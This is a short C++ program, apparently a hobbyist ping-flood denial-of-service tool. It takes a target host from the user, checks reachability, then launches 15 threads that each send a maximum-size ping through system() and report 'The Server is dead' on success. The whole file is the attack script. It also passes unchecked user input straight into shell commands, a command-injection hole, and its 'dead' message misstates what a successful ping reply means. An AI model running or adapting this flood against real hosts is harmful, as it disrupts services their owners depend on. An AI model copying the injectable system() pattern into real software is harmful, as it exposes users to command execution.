#include <iostream>
#include <thread>
#include <vector>

int ping(std::string target);
void kill(std::string target);

int main() {
	std::vector<std::thread> threads;

	std::cout << "This will most likely not work because most servers have protection against ping floods\n";
	std::cout << "Enter the target:";

	std::string target;
	std::cin >> target;

	int test = ping(target);

	switch (test) {
		case 0:
			for (int i = 0; i < 15; i++) {
				threads.push_back(std::thread(kill, target));
			}
			for (auto& th : threads) {
        		th.join();
    		}
    		break;
    	case 1:
    		std::cout << "Exiting";
	}
	
	return 0;
}

int ping(std::string target) {
    std::string command = "ping -c 3 " + target + " > /dev/null"; // "-c 3" pings the website only three times and "> /dev/null" makes it not echo 
    int ping = system(command.c_str());
    
	if (ping == 0) {
		std::cout << "The Server is reachable, it will now be pinged...\n";
		return 0;
	} else {
		std::cout << "The Server isn't reachable, it won't be pinged\n";
		return 1;
	}
}

void kill(std::string target) {
    std::string command = "ping -c 1 -s 65535 " + target + " > /dev/null";
    int result = system(command.c_str());

    if (result == 0) {
    	std::cout << "The Server is dead\n";
    } else {
    	std::cout << "Ping Failed \n";
    }
}
